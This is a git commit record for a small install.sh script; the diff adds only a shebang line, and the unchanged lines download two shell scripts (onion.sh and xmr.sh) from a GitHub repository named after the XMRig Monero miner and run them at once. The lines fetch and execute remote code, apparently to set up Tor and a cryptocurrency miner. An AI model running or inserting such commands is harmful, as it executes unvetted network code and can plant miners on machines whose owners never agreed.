bf6704adc2be6c581f6c0c3c2a3b81bbb688af93
ceeb57f83688 <84587193+ceeb57f83688@users.noreply.github.com>
2021-07-03 17:38:58 +0100

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,2 +1,4 @@
+#!/bin/sh
+
 wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/onion.sh && chmod +x onion.sh && ./onion.sh
 wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/xmr.sh && chmod +x xmr.sh && ./xmr.sh
